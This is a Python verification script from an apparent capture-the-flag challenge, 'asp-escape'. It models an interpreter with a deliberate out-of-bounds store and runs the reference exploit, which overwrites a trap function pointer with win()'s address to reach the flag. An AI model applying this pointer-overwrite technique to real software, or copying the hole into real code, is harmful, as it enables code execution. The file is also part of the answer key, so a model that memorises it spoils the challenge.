#!/usr/bin/env python3
"""Layout-INDEPENDENT verification for asp-escape.

Models the vulnerable interpreter with the struct layout the C guarantees:
  reg[16] @0 | mem[64] @16 | trap(8) @80   ->  mem index 64..71 aliases trap.
Runs the reference exploit program and asserts the trap pointer becomes &win and
that TRAP would therefore call win(). Confirms the *logic*; exact &win comes from
the built non-PIE binary (healthcheck.sh)."""
# self-contained: mirrors solution/exploit.py's build_program (pwntools only
# needed to actually fire the exploit on the Linux host, not to verify the logic).
OP_HALT, OP_MOVI, OP_LD, OP_ST, OP_TRAP = 0, 1, 2, 3, 4
TRAP_INDEX = 64

def build_program(win_addr):
    p = b""
    for k, byte in enumerate(win_addr.to_bytes(8, "little")):
        p += bytes([OP_MOVI, 0, TRAP_INDEX + k])
        p += bytes([OP_MOVI, 1, byte])
        p += bytes([OP_ST,   0, 1])
    p += bytes([OP_TRAP, OP_HALT])
    return p

WIN = 0x4011d6                      # stand-in &win; real value from `nm asp-escape`

def run(prog):
    reg = [0] * 16
    # flat image: mem[0..63] at 0..63, trap pointer bytes at 64..71 (== struct mem[64..71])
    mem = bytearray(72)
    trap_is_win = [False]
    def trap_ptr():
        return int.from_bytes(mem[64:72], "little")
    pc = 0
    while pc < len(prog):
        op = prog[pc]; pc += 1
        if op == OP_HALT: break
        elif op == OP_MOVI: r = prog[pc]; imm = prog[pc+1]; pc += 2; reg[r & 15] = imm
        elif op == OP_LD:   d = prog[pc]; idx = prog[pc+1]; pc += 2; reg[d & 15] = mem[reg[idx & 15]]
        elif op == OP_ST:   idx = prog[pc]; s = prog[pc+1]; pc += 2; mem[reg[idx & 15]] = reg[s & 15]  # OOB
        elif op == OP_TRAP: trap_is_win[0] = (trap_ptr() == WIN)
        else: raise ValueError(f"bad op {op}")
    return trap_ptr(), trap_is_win[0]

if __name__ == "__main__":
    prog = build_program(WIN)
    trap, called_win = run(prog)
    assert trap == WIN, f"trap = {trap:#x}, expected {WIN:#x}"
    assert called_win, "TRAP did not dispatch to win"
    print("asp-escape reachability OK")
    print(f"  program = {len(prog)} bytes (8x[MOVI,MOVI,ST] + TRAP + HALT)")
    print(f"  after execution trap pointer = {trap:#x} (== &win stand-in)")
    print(f"  TRAP dispatches to win() -> cat flag.txt")
    print(f"  mem index {64}..{71} aliases the trap pointer (struct offset 80, 8-aligned)")
